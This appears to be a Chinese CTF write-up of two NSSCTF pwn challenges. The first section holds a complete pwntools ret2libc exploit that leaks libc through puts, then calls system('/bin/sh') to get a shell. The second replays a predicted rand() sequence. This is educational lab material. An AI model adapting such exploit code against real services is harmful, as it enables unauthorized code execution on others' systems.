## NSSCTF[PWN]

### [[2021 鹤城杯\]babyof | NSSCTF](https://www.nssctf.cn/problem/469)

1. 进main函数查看，其中一个函数存在栈溢出，程序没有system而后bin/sh，明显的ret2libc：

   ![image-20240531111622228](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311116268.png)

2. EXP，注意libc版本选择3才能打通：

   ``````python
   from pwn import *
   from LibcSearcher import *
   
   context(os='linux', arch='amd64', log_level='debug')
   
   p=remote("node4.anna.nssctf.cn",28236)
   elf=ELF('./babyof')
   got = elf.got['puts']
   plt = elf.plt['puts']
   main_addr = 0x40066B
   print(hex(got),hex(plt))
   
   pop_rdi_ret = 0x400743
   
   payload = b'a'*(0x40+8)+p64(pop_rdi_ret)+p64(got)+p64(plt)+p64(main_addr)
   
   p.recv()
   p.sendline(payload)
   
   addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
   print(hex(addr))
   
   
   libc = LibcSearcher('puts',addr)
   libcbase = addr - libc.dump('puts')
   sys_addr = libcbase + libc.dump('system')
   str_sh   = libcbase + libc.dump('str_bin_sh')
   print(hex(sys_addr),hex(str_sh))
   
   payload = b'a'*(0x40+8)+p64(0x400506)+p64(pop_rdi_ret)+p64(str_sh)+p64(sys_addr)
   p.sendline(payload)
   p.sendline(b'cat flag')
   p.interactive()
   ``````

   ![image-20240531111749407](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202405311117470.png)

### [[GDOUCTF 2023\]真男人下120层 | NSSCTF](https://www.nssctf.cn/problem/3663)

1. 题目没给啥溢出的漏洞，nc连接后发现产生的随机数也不固定，所以只能随便拿一个时间戳，按题目的方法生成120的随机数，然后脚本多次连接去碰运气了，time(0)获取当前时间的秒，一共60种情况，也就是60种达成题目要求的方法。

   ![image-20240704094758294](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407040947392.png)

2. 产生一种达成要求的随机数：

   ![image-20240704095202003](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407040952092.png)

   ![image-20240704095213616](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407040952733.png)

3. 最后EXP多次运行即可，运气好一次就能拿到flag：

   ```python
   from pwn import *
   from LibcSearcher import *
   # 设置系统架构, 
   context(log_level='debug',arch='amd64')
   p = remote("node4.anna.nssctf.cn",28683)
   # p = process("./pwn")
   flag=[]
   table = [2,3,1,3,2,2,1,3,2,2,4,2,1,4,2,2,3,2,1,3,3,2,4,2,4,2,1,1,3,1,1,1,4,2,3,1,3,4,3,4,1,2,1,1,1,3,2,3,4,3,1,3,4,4,4,3,1,1,4,4,1,4,4,4,1,2,4,3,1,2,3,1,3,3,2,3
   ,1,3,1,1,1,1,3,1,4,2,3,1,2,2,4,3,2,3,2,2,4,2,1,1,3,3,1,2,1,2,4,2,1,1,2,1,1,4,1,1,1,4,1,3]
   p.recv()
   count=0
   for i in table:
       count+=1
       print(count)
       p.sendline(str(i).encode())
       p.recv()
   p.recv()
   p.interactive()
   ```

   ![image-20240704095350748](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407040953831.png)



